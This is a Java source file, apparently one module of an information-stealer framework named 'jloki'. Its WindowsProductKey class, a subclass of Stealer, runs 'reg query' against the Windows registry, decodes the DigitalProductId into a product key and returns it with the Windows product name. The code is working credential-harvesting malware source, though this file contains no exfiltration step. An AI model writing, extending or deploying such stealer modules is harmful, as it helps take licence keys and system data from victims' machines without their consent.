package me.jershdervis.jloki.steal.stealers;

import me.jershdervis.jloki.steal.Stealer;
import me.jershdervis.jloki.util.StreamReader;
import me.jershdervis.jloki.util.WinRegistry;

import java.lang.reflect.InvocationTargetException;

/**
 * Created by JershDervis on 28/07/2015.
 */
public class WindowsProductKey extends Stealer {

    private static final String REGQUERY_UTIL    = "reg query ";
    private static final String REGBINARY_TOKEN  = "REG_BINARY";
    private static final String PRODUCT_KEY_CMD         = REGQUERY_UTIL +
            "\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\" /v DigitalProductId";

    public WindowsProductKey() {
        super("WINDOWS_PRODUCT_KEY");
    }

    @Override
    public String[] run() {
        String productName;
        String key;
        try {
            productName = WinRegistry.readString(WinRegistry.HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName", WinRegistry.KEY_WOW64_32KEY);
            key = this.getProductKey();
            return new String[] {productName, key};
        } catch (InvocationTargetException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }
        return null;
    }

    private String queryRegistry(String cmd, String token)
    {
        try
        {
            Process process = Runtime.getRuntime().exec(cmd);
            StreamReader reader = new StreamReader(process.getInputStream());

            reader.start();
            process.waitFor();
            reader.join();

            String result = reader.getResult();
            int p = result.indexOf(token);

            if (p == -1)
                return null;
            return result.substring(p + token.length()).trim();
        }
        catch (Exception e)
        {
            System.out.println("Query of Registry failed.");
            return null;
        }
    }

    private String getProductKey() throws InvocationTargetException, IllegalAccessException
    {
        String fullPID = "";
        if(queryRegistry(PRODUCT_KEY_CMD, REGBINARY_TOKEN) != null)
            fullPID = queryRegistry(PRODUCT_KEY_CMD, REGBINARY_TOKEN);

        String encodedKey = fullPID.substring(104, 134);

        final char[] digits = {'B', 'C', 'D', 'F', 'G', 'H', 'J', 'K',
                // 0    1    2    3    4    5    6    7
                'M', 'P', 'Q', 'R', 'T', 'V', 'W', 'X',
                // 8    9    10   11   12   13   14   15
                'Y', '2', '3', '4', '6', '7', '8', '9'};

        final int D_LEN = 29;

        final int S_LEN= 15;

        int[] hexDigitalPID = new int[D_LEN];
        char[] des = new char[D_LEN + 1];
        int i = 0;
        int n = 0;
        int hn = 0; // 0xffffffffL & (long)tmp;

        String rval = "";

        for(i = 0; i <= 14; ++i)
            hexDigitalPID[i] = Integer.decode("0x" + encodedKey.substring(i * 2, (i * 2) + 2)).intValue();
        for(i = D_LEN - 1; i >= 0; --i)
        {
            if(((i + 1) % 6) == 0)
                des[i] = '-';
            else
            {
                hn     = 0;
                for(n = S_LEN - 1; n >= 0; --n)
                {
                    hn = ((hn << 8) + hexDigitalPID[n]);
                    hexDigitalPID[n] = (hn / 24);
                    hn = (hn % 24);
                }
                des[i] = digits[hn];
            }
        }
        des[D_LEN] = '\n';
        for(i = 0; des[i] != '\n' ; ++i)
            rval += des[i];
        return rval;
    }
}
